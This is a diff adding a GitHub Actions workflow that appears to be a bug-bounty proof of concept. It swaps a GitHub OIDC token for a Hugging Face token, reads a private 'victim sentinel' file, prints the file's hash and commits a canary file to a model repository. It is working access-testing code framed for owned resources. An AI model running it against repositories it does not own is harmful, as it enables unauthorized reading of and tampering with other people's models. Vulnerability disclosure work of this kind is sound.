@@ -1,0 +1,56 @@
+name: HF Trusted Publisher A/B Canary
+
+on:
+  workflow_dispatch:
+    inputs:
+      resource:
+        description: Owned Hugging Face model resource
+        required: true
+        type: string
+      marker:
+        description: Non-secret A/B canary marker
+        required: true
+        type: string
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  publish-canary:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Exchange GitHub OIDC and write owned canary
+        env:
+          RESOURCE: ${{ inputs.resource }}
+          MARKER: ${{ inputs.marker }}
+        run: |
+          set -euo pipefail
+          oidc_response="$(curl -fsS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fhuggingface.co")"
+          OIDC_TOKEN="$(jq -er .value <<<"$oidc_response")"
+          echo "::add-mask::$OIDC_TOKEN"
+          export OIDC_TOKEN
+          python - <<'PY'
+          import base64, json, os
+          payload_part = os.environ["OIDC_TOKEN"].split(".")[1]
+          payload_part += "=" * (-len(payload_part) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(payload_part))
+          keys = ["repository", "repository_id", "repository_owner", "repository_owner_id", "sub", "ref", "workflow_ref", "job_workflow_ref", "actor", "actor_id"]
+          print("OIDC_CLAIMS=" + json.dumps({key: claims.get(key) for key in keys}, sort_keys=True))
+          PY
+          exchange_payload="$(jq -cn --arg subject_token "$OIDC_TOKEN" --arg resource "$RESOURCE" '{grant_type:"urn:ietf:params:oauth:grant-type:token-exchange",subject_token_type:"urn:ietf:params:oauth:token-type:id_token",subject_token:$subject_token,resource:$resource}')"
+          exchange_response="$(curl -fsS -X POST https://huggingface.co/oauth/token -H 'Content-Type: application/json' --data "$exchange_payload")"
+          HF_TOKEN="$(jq -er .access_token <<<"$exchange_response")"
+          echo "::add-mask::$HF_TOKEN"
+          jq -c '{token_type,expires_in,issued_token_type}' <<<"$exchange_response" | sed 's/^/HF_EXCHANGE=/'
+          sentinel_file="$(mktemp)"
+          curl -fsS "https://huggingface.co/${RESOURCE}/resolve/main/PRIVATE_VICTIM_SENTINEL.txt" -H "Authorization: Bearer $HF_TOKEN" -o "$sentinel_file"
+          sha256sum "$sentinel_file" | awk '{print "HF_PRIVATE_READ_SHA256=" $1}'
+          rm -f "$sentinel_file"
+          marker_b64="$(printf '%s\n' "$MARKER" | base64 -w0)"
+          commit_header="$(jq -cn --arg summary "OIDC A/B canary: $MARKER" '{key:"header",value:{summary:$summary,description:"Owned H1 A/B canary only"}}')"
+          commit_file="$(jq -cn --arg content "$marker_b64" '{key:"file",value:{content:$content,path:"OIDC_RESURRECTION_CANARY.txt",encoding:"base64"}}')"
+          payload_file="$(mktemp)"
+          printf '%s\n%s\n' "$commit_header" "$commit_file" >"$payload_file"
+          commit_response="$(curl -fsS -X POST "https://huggingface.co/api/models/${RESOURCE}/commit/main" -H "Authorization: Bearer $HF_TOKEN" -H 'Content-Type: application/x-ndjson' --data-binary "@$payload_file")"
+          jq -c '{success,commitOid,commitUrl}' <<<"$commit_response" | sed 's/^/HF_COMMIT=/'
